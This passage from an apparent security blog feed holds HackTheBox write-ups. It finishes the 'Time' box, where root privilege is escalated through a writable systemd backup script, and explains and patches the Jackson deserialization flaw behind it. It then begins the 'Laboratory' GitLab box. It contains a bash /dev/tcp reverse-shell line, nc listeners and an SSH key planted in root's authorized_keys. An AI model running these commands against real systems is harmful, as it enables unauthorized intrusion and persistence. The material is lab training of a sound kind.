+zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
+</code></pre></div><p>Interestingly, that script is writable by others.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
+-rwxrw-rw- <span class="m">1</span> pericles pericles <span class="m">88</span> Apr <span class="m">10</span> 21:05 /usr/bin/timer_backup.sh
+</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -name <span class="s2">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
+   <span class="m">795750</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">214</span> Oct <span class="m">23</span> 06:46 /etc/systemd/system/timer_backup.timer
+   <span class="m">787186</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">159</span> Oct <span class="m">23</span> 05:59 /etc/systemd/system/timer_backup.service
+  <span class="m">1317302</span>      <span class="m">4</span> -rwxrw-rw-   <span class="m">1</span> pericles pericles       <span class="m">88</span> Apr <span class="m">10</span> 21:10 /usr/bin/timer_backup.sh
+</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
+<span class="o">[</span>Unit<span class="o">]</span>
+<span class="nv">Description</span><span class="o">=</span>Backup of the website
+<span class="nv">Requires</span><span class="o">=</span>timer_backup.service
+
+<span class="o">[</span>Timer<span class="o">]</span>
+<span class="nv">Unit</span><span class="o">=</span>timer_backup.service
+<span class="c1">#OnBootSec=10s</span>
+<span class="c1">#OnUnitActiveSec=10s</span>
+<span class="nv">OnUnitInactiveSec</span><span class="o">=</span>10s
+<span class="nv">AccuracySec</span><span class="o">=</span>1ms
+
+<span class="o">[</span>Install<span class="o">]</span>
+<span class="nv">WantedBy</span><span class="o">=</span>timers.target
+</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
+<span class="o">[</span>Unit<span class="o">]</span>
+<span class="nv">Description</span><span class="o">=</span>Calls website backup
+<span class="nv">Wants</span><span class="o">=</span>timer_backup.timer
+<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+
+<span class="o">[</span>Service<span class="o">]</span>
+<span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/systemctl restart web_backup.service
+</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/web_backup.service
+<span class="o">[</span>Unit<span class="o">]</span>
+<span class="nv">Description</span><span class="o">=</span>Creates backups of the website
+
+<span class="o">[</span>Service<span class="o">]</span>
+<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /usr/bin/timer_backup.sh
+</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
+<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
+pericles@time:~$ 
+pericles@time:~$ cat /usr/bin/timer_backup.sh 
+<span class="c1">#!/bin/bash</span>
+zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
+bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.72/9002 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
+$ rlwrap nc -nvlp <span class="m">9002</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
+connect to <span class="o">[</span>10.10.14.72<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">57648</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>411032<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+root@time:/# 
+root@time:/# <span class="nb">exit</span>
+</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
+$ nc -nvlp <span class="m">9002</span>                          
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
+connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">34182</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>65312<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+root@time:/#  <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; /root/.ssh/authorized_keys
+&lt;rj6mXxSIGq3E5ks1g+moK<span class="err">&#39;</span> &gt; /root/.ssh/authorized_keys
+root@time:/# <span class="nb">exit</span>
+</code></pre></div><p>After that, I can login as root via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
+$ ssh root@10.10.10.214
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>
+
+...&lt;SNIP&gt;...
+  System load:             0.0
+  Usage of /:              21.2% of 27.43GB
+  Memory usage:            16%
+  Swap usage:              0%
+  Processes:               <span class="m">235</span>
+  Users logged in:         <span class="m">0</span>
+  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
+  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553
+
+
+...&lt;SNIP&gt;...
+Last login: Tue Feb  <span class="m">9</span> 14:41:33 <span class="m">2021</span>
+root@time:~# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@time:~# cut -c-16 root.txt 
+27375f967f43232f
+</code></pre></div><h2 id="extras">Extras</h2>
+<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
+<h3 id="cve-2019-12384">CVE-2019-12384</h3>
+<h4 id="causes">Causes</h4>
+<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
+<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
+</p>
+<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">){</span>
+                <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;/dev/shm&#34;</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">);</span>
+                <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
+                <span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span> <span class="c1">// Condition #1,  $txt controlled by user. no filter
+</span><span class="c1"></span>                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$txt</span><span class="p">);</span> 
+                <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
+                <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span class="si">$filename</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nv">$cmdout</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
+                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
+                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span><span class="p">{</span>
+                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span class="o">.</span> <span class="nv">$cmdout</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+                <span class="nv">$json_ugly</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
+                <span class="nv">$json_pretty</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json_ugly</span><span class="p">),</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">);</span>
+                <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$json_pretty</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">...&lt;SNIP&gt;...
+</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>
+
+<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
+      <span class="nb">require</span> <span class="n">f</span>
+<span class="k">end</span>
+
+<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
+<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
+<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
+<span class="nb">puts</span> <span class="n">content</span>
+
+<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
+<span class="n">mapper</span><span class="o">.</span><span class="n">enableDefaultTyping</span><span class="p">()</span> <span class="c1"># Condition #2, the uses of &#34;default typing&#34;.</span>
+<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
+<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
+<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@time:/opt/json_project# grep -Ri version
+Binary file classpath/h2-1.4.199.jar matches
+Binary file classpath/jackson-databind-2.9.8.jar matches
+Binary file classpath/logback-core-1.3.0-alpha5.jar matches
+Binary file classpath/jackson-core-2.9.8.jar matches
+</code></pre></div><h4 id="mitigation">Mitigation</h4>
+<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>
+
+<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
+      <span class="nb">require</span> <span class="n">f</span>
+<span class="k">end</span>
+
+<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
+<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
+<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
+<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
+<span class="nb">puts</span> <span class="n">content</span>
+
+<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
+<span class="n">mapper</span><span class="o">.</span><span class="n">activateDefaultTyping</span><span class="p">()</span> <span class="c1"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
+<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">MapperFeature</span><span class="o">::</span><span class="no">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span><span class="p">);</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
+<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
+<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
+<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="c1"># ./time.sh patch [ip]</span>
+<span class="nv">project_path</span><span class="o">=</span><span class="s2">&#34;/opt/json_project/&#34;</span>
+<span class="nv">new_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.11.0.jar&#34;</span>
+<span class="nv">old_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.9.8.jar&#34;</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;patch&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+	<span class="c1"># backup the original code</span>
+	mkdir -p /dev/shm/orig/
+	mv <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$old_jackson</span> /dev/shm/orig/
+	mv <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span> /dev/shm/orig/
+	
+	<span class="c1"># These file hosted from my machine</span>
+	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$new_jackson</span><span class="s2">&#34;</span> &gt; /tmp/<span class="nv">$new_jackson</span>
+	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
+	
+	<span class="c1"># move the updated parser and jackson</span>
+	cp /tmp/<span class="nv">$new_jackson</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span> 
+	cp /tmp/parse.rb <span class="s2">&#34;</span><span class="nv">$project_path</span><span class="s2">&#34;</span>
+	chmod +x <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
+	
+<span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;restore&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+	rm <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span>
+	rm <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
+	
+	mv <span class="s2">&#34;/dev/shm/orig/</span><span class="nv">$old_jackson</span><span class="s2">&#34;</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span>
+	mv <span class="s2">&#34;/dev/shm/orig/parse.rb&#34;</span> <span class="nv">$project_path</span>
+	
+	rm /tmp/<span class="nv">$new_jackson</span> 
+	rm /tmp/parse.rb
+	rm -r /dev/shm/orig/
+	
+<span class="k">fi</span>
+</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect back. I checked the validator on the browser, and now it returned this  message.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: WARNING: An illegal reflective access operation has occurred
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
+</p>
+<p>Well, it is working, isn’t it?</p>
+<hr>
+<h2 id="references">References</h2>
+<p>Exploitation:</p>
+<ul>
+<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
+<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
+</ul>
+<p>Mitigation:</p>
+<ul>
+<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
+<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Laboratory</title>
+      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
+      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
+      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
+      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Arbitrary File Read</li>
+<li>Adding Metasploit module</li>
+<li>Exploiting GitLab 12.8.1~12.9.0</li>
+<li>Recover a git repository</li>
+<li>SUID exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Metasploit - Preinstalled in Kali Linux</li>
+<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: The Laboratory
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+<span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+<span class="p">|</span> Public Key type: rsa
+<span class="p">|</span> Public Key bits: <span class="m">4096</span>
+<span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+<span class="p">|</span> Not valid before: 2020-07-05T10:39:28
+<span class="p">|</span> Not valid after:  2024-03-03T10:39:28
+<span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
+<span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
+<p>On the HTTPS port, the certificate discloses a subdomain.</p>
+<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
+<p>There is nothing really interesting here.</p>
+<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
+</p>
+<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
+<p>A GitLab instance is presented on this page.</p>
+<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
+</p>
+<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
+<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
+</p>
+<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
+<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
+<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
+</p>
+<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
+<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
+</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ searchsploit gitlab
+------------------------------------------------------------------------- -----------------------------
+Exploit Title                                                           <span class="p">|</span>  Path
+------------------------------------------------------------------------- -----------------------------
+GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
+GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
+Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
+------------------------------------------------------------------------- ------------------------------
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-git">Shell as git</h3>
+<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
+<blockquote>
+<p>CVE-2020-10977:
+GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
+</blockquote>
+<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
